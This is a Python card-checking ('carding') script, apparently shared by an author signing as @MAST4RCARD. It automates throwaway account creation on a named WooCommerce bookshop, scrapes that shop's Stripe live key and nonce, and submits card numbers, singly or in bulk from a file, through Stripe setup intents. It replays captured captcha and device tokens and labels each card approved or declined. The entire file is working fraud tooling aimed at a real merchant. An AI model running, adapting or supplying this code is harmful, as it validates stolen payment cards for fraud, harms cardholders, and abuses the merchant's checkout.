import requests
import re
import time
import random
import string
from colorama import Fore, Style, init

init(autoreset=True)

user = f"user{random.randint(1000,9000)}"
email = f"{user}@gmail.com"


class MultilitProcessor:
    def __init__(self):
        self.session = requests.Session()
        self.url = 'https://bookshop.multilit.com/my-account/'

    def register_account(self):
        headers_get = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'referer': 'https://bookshop.multilit.com/',
        }
        print("1. My Account Register...")
        response_get = self.session.get(self.url, headers=headers_get)
        match = re.search(r'name="woocommerce-register-nonce" value="([a-z0-9]+)"', response_get.text)
        if not match:
            #print("HATA: Nonce bulunamadı!")
            print(response_get.text[:1000])
            return False
        reg = match.group(1)
      #  print("Nonce:", reg)

        data = {
            'email': email,
            'password': user,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://bookshop.multilit.com/my-account/add-payment-method/',
            'wc_order_attribution_session_start_time': '2025-11-14 17:34:35',
            'wc_order_attribution_session_pages': '4',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'woocommerce-register-nonce': reg,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        headers_post = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://bookshop.multilit.com',
            'referer': 'https://bookshop.multilit.com/my-account/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }

        response = self.session.post(self.url, data=data, headers=headers_post, allow_redirects=True)
        if response.status_code == 200 and "login" not in response.url and "register" not in response.url:
            #print("REG DONE")
            return True
        else:
       #     print("REG FAILED")
            print(response.url)
            return False

    def get_stripe_keys(self):
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://bookshop.multilit.com/my-account/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }

        response = self.session.get('https://bookshop.multilit.com/my-account/payment-methods/', headers=headers)
        pk_live_match = re.search(r'pk_live_[a-zA-Z0-9]+', response.text)
        addnonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)

        if not pk_live_match or not addnonce_match:
           # print("HATA: pk_live veya nonce alınamadı!")
            return None, None

        pk_live = pk_live_match.group(0)
        addnonce = addnonce_match.group(1)
        print("pk_live:", pk_live)
        print("addnonce:", addnonce)
        return pk_live, addnonce

    def create_payment_method(self, n, mm, yy, cvc, pk_live):
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }

        data = (
            f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}'
            f'&allow_redisplay=unspecified&billing_details[address][country]=TR'
            f'&payment_user_agent=stripe.js%2F851131afa1%3B+stripe-js-v3%2F851131afa1%3B+payment-element%3B+deferred-intent'
            f'&referrer=https%3A%2F%2Fbookshop.multilit.com&time_on_page=1345043'
            f'&client_attribution_metadata[client_session_id]=83659157-9cf5-4b28-b011-29d5cc76d286'
            f'&client_attribution_metadata[merchant_integration_source]=elements'
            f'&client_attribution_metadata[merchant_integration_subtype]=payment-element'
            f'&client_attribution_metadata[merchant_integration_version]=2021'
            f'&client_attribution_metadata[payment_intent_creation_flow]=deferred'
            f'&client_attribution_metadata[payment_method_selection_flow]=merchant_specified'
            f'&client_attribution_metadata[elements_session_config_id]=4e5d2fb1-5cb2-4f19-9549-bd53937afc67'
            f'&client_attribution_metadata[merchant_integration_additional_elements][0]=payment'
            f'&guid=e99206a4-2f33-4649-90ec-816d7397bb3b1a92ec'
            f'&muid=3bc400e1-7fc8-40f9-8723-ba567618c7b44a4743'
            f'&sid=266ff471-27ec-4046-bcb5-eccfc26d9e2cc0c391'
            f'&key={pk_live}'
            f'&_stripe_version=2024-06-20'
            f'&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzYzMTQ0NTYwLCJjZGF0YSI6InE4Ym1HUFBFTzBZODlUcW1uVWRXTnRnTml2VEtnc241K3JMbXVyNzR3WnRzK3RPUEdTWWxVbmoyNCsxVW1SaHBXZUk5dC9XekxuWWFKWndTR1F1c1hKS1FYdWtOV00rTFQxVFI1UVREeUdGeCtVZFFZQWNBVC85ZGpJbVlxdWhEVnpJaUJoNHFldXByYUZIZlRnaEIzUDhubWFmdndBVGlQd1lhSHNxMnFZcWQraDJEb1o4NzdJNm1nSTBKNjFWV05YZFFLWTExNktSYWJCRWEiLCJwYXNza2V5IjoiNnkrREhEU1RGZEZjL3BLR3hLd0laNVlyUno4RmxUY1dwZ1NLNTJoVHZjS2o1ZHFzdlR4Q0VvYkdTUUx5U3IrM0tnM3hvUWtOTGlFUTNnYXFRaXpvREtJK0RuSTB3ZzJOaDRRRXNZRjJCcjRmNjRSSTZESmRScm5hMGVhMUZVdmVOZUtuZWNUTmdBVjJPV21jMkNHb1VFWG9WOEhNZkVKMGpDUjJraWpSbjN1eFIvOERJbG5nVWZqNVVSWlpVa3F2ZzRLdCtQYnlnQXFnKzlxSWJRM0wzYTlSMHE2NDZUcTl1dHZEa1hCL01icVZ0aXAvQURIVWZHWElFS3NBRXFYM3gydTVzR2hwSzZ5Skx2MFlOcEpJaGtzMXU2c2doR01YVzRHd21LMDRxWmFtUXdYZFp3SGhSZU80aXBLZ0FsOUd3STlxQ2F1NCtBcmlRSWlBaGhFOGs3WVd1VTV3NHRJVkQ0UkFTb04zOUNVU1pjTkNHR2w1RTJoVDZMZnpqbDRoNGRYdHNGeDhKY09nQ0thYW9LcHduTElyL0lPNTE1b3YzeWs3OC9GYU9EY0lmM2s5Q0dxakR3Qytic0E5TFRwa01xMHlGV1l6a0dMN3B1MitUUXNIRExlRUMyRXFxMW9xOS84ZEZKcm00SUxlZ01PZmhiWDdneDE1SFZNSnpwMVZWSlVhSlJFeTU1cHluanFNbWkwR01Pb2x6VEVOb1hSZmdYWEU1cmJZbzIwZFNueDlBY05aL0plazlQUitOdUlERW9EQjQ3aVE2OTVyN2JVYjNjVjdFK3Y4SWNwdVp1R1Z2ZnBBTmZqakdKdDdnb1h2V2R5aHdIUDdJNTcrZXlGR3NDSkRIVmxqd0N1eHRpMVM4cXl6eFhicnUzNFBQUnJPeXdWb1cwTVgxMTZlR2ZDdHp5ODJ0Zk85NWZTR0I1Z0dHYW4rRVZORWhsYmwySjYxaDBuMTR4YXNuZk1EL1B6ZmtFLzFtcEJtZXRRRHJjby9hUWw5UC9QSDAvUFRSbzBTOGV3ck5DOW5HaXBXNE52NXhiN0MwSFp1SHN4a09iRkw1aE04dGd3MVBPSkwwcjFjVFQyOVlTbXRhQ0d3ZXRUSlVaamlCeUJLQjhSODcwbEtoSUhPNDJlNmVvKzdoSzRZZEluT3I4aFZ3eENwRDBJcytMTGxIem1ndDFrbXVWWS9Lak5XbkI4Q0ltcHc4VzIxaVJueS84VnpuN050TlIzZms1R0pHU3UrM1gvQzhETDZoOXg3QWg5enVKN0NiVTlMMFBYZ3hSL1c4aTJ5M3NWV2RGUGVJYXZtakxxdTZ3NHFmLzg3b2ZoS3dGc0hvL3NmeloxSVJOQTRwakVvaXFEMUh2OHdlWnJScFNWUUJYT3kxN2JiM3l5RnE3U1dTdTUzOXhlVVdnUEpoeUlEdFBwOXFuYVQ4LzVvR0ZCUjdtV3g5TVpXRDdWZ1VTMm13ZWNBYmZBT3NqQXo4YXZJQUxxc3Q5Nks4eXY1bkpTc0J5ZThzeVBxTmw4MU9kZXJ6SFRoNEJycGNldy91NTZUbjZXSElYeEp3SEpEcDdtc2FoZ2xOQXFhREhlTzB6WnZ6cXZJTGExNHl2c3czU2xqVmREWFRTY01oU0doRlBZajNNOWduOW1kdXJmSlpiVTkxY21tcERCaHRxMlNaRFBBSWNQUHNyRVZiMmNSVG5BeXd4UzVFNUx5dHpVTnVnbGt0dUpqdHdXTysxNzY5VWlYNU9Fc25MZTI3MkVBNGY5MFNsZmh4K2lHM1NLWkorTkVyYXRWTkx6VU8vQzZXR3ZlWno0K2hmSTllK20yV2JnTnFxbjR5bWZWMmVBWFNkSmM1akt4MFhtdE9sVTR4bVc3TUJ6bUlDNGV6SjlSVDgydUxHenZZcThKUmRvYmQwUVJocXpRSG9BTWRSY3ZVNmdVY05IVXQvbHZucGVjTWlwMlZBMlVnWUhKdmhXSmYzbDBodHdjSldQRTY0VzBJY0dWU3d4ZklacVZnUGNSMk56aVJDZzVaWUFHZzZmMHFiYlhhNG5aWEZsQnNyN3lMSFZRdTJjTlQ2TTgvUVdBTDRoQyt6WlV5NUt6bFhyejhuTVB6WjB3NnorZlhZekJyMWE1TnB3NnpZeUMrT05xdnB4MlAwM0l6NU41d0pBRncrVThmaDVQL0ZCQTdWczFwcWJwN0JZRCtMZE4yd3BjMi9pRVVBeVpHQ3JMUHl4QlVFeEFFOVlXSk1uU29VQjNGR29nVURRNExRMVZSSDdqY0RJNmpSTHdBVzluelF3eHY3WVpSYTdXSzdEUW9MZGRmYzlSVEpFY1lkaUVsRjlqaFJYSXVmSHVvcVNzQ2VqcUFGbUJpK21RTDBCVVpIMDRLMG95aitGdXJNTY3cDJGN3BDTGdZbytsUlZ1eFVlMTAzYTNneDAwei9GUFJGM1JiWEJrR2hoZGVyK1ZVTlJWbTRaQXhlS2JWMDFYVlJucEVRNlVzYWlJbXo1ZlpCYXBqWW9YQWJBY2lMOE5EMU9FajZDK1FWOHQyU3libGpUQ1pFWVVCRkZnckZvNHhZTXJNQ3U2YWNiQTZEd2ZvRTRhd281d1h1aWVvc3dsUStKeEI3TT0iLCJrciI6IjViNDJkZjUiLCJzaGFyZF9pZCI6MzM5NTEwMzAzfQ.bVRXJgsqWR25ZmM7Xj15sNNRIoziIQUd9iHbCaH0iT4'
        )

        response = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        if response.status_code != 200:
           # print(f"[ERROR] PM Create Failed: {response.status_code} | {response.text[:300]}")
            return None

        try:
            json_resp = response.json()
            pm_id = json_resp.get('id')
            if pm_id:
                print(f"[SUCCESS] PM Created: {pm_id}")
            else:
                print(f"[ERROR] No PM ID: {json_resp}")
            return pm_id
        except Exception as e:
            print(f"[ERROR] JSON Parse Error: {e}")
            return None

    def confirm_intent(self, pm_id, addnonce):
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://bookshop.multilit.com',
            'referer': 'https://bookshop.multilit.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnonce,
        }

        response = self.session.post('https://bookshop.multilit.com/wp-admin/admin-ajax.php', headers=headers, data=data)

        if response.status_code != 200:
            error_msg = f"HTTP {response.status_code}"
            print(f"[ERROR] Confirm Failed: {error_msg}")
            return error_msg

        try:
            resp_json = response.json()

            if resp_json.get('success'):
                return "APPROVED"

            if resp_json.get('data', {}).get('requires_action'):
                return "3DS REQUIRED"

            error_message = (
                resp_json.get('data', {}).get('message') or
                resp_json.get('message') or
                "DECLINED"
            )
            print(f"[DECLINED] {error_message}")
            return error_message

        except Exception as e:
            raw = response.text[:300]
            print(f"[ERROR] JSON Parse Failed: {e} | Raw: {raw}")
            return "PARSE ERROR"


    def process(self, card_line):
        parts = [p.strip() for p in card_line.split('|')]
        if len(parts) != 4:
            return "INVALID_FORMAT"
        n, mm, yy, cvc = parts
        n = n.replace(" ", "")

        if not self.register_account():
            return "REG_FAILED"

        pk_live, addnonce = self.get_stripe_keys()
        if not pk_live or not addnonce:
            return "KEY_ERROR"

        pm_id = self.create_payment_method(n, mm, yy, cvc, pk_live)
        if not pm_id:
            return "PM_CREATE_FAILED"

        result = self.confirm_intent(pm_id, addnonce)
        return result



print(f"{Fore.MAGENTA}╔═══════════════════════════════════════╗")
print(f"║ {Fore.CYAN}STRİPE AUTH AUTO CODE BY @MAST4RCARD {Fore.MAGENTA} ║")
print(f"╚═══════════════════════════════════════╝{Style.RESET_ALL}\n")
print("1 - Single card check")
print("2 - Mass check (from file)")
choice = input("Select check type: ").strip()

processor = MultilitProcessor()

if choice == "1":
    card = input("Enter card (format: 412118...|05|2030|123): ").strip()
    if not card or "|" not in card or card.count("|") != 3:
        print("Invalid card format!")
    else:
        print("Checking card...")
        result = processor.process(card)
        
        if result == "APPROVED":
            color = Fore.GREEN
        elif result == "3DS REQUIRED":
            color = Fore.YELLOW
        else:
            color = Fore.RED

        print(f"{card} : {color}{result}{Style.RESET_ALL}")

elif choice == "2":
    filename = input("Enter filename (e.g. cards.txt): ").strip()
    if not filename:
        print("No file specified!")
    else:
        try:
            with open(filename, "r", encoding="utf-8") as f:
                cards = [line.strip() for line in f if line.strip() and "|" in line]
            if not cards:
                print("No valid cards found in file!")
            else:
                print(f"Found {len(cards)} cards. Starting mass check...\n")
                for card in cards:
                    result = processor.process(card)
                    if result == "APPROVED":
                        color = Fore.GREEN
                    elif result == "3DS REQUIRED":
                        color = Fore.YELLOW
                    else:
                        color = Fore.RED
                    print(f"{card} : {color}{result}{Style.RESET_ALL}")
                    time.sleep(1.5)
                print("\nMass check completed.")
        except FileNotFoundError:
            print(f"File '{filename}' not found!")
        except Exception as e:
            print(f"Error reading file: {e}")
else:
    print("Invalid choice! Please select 1 or 2.")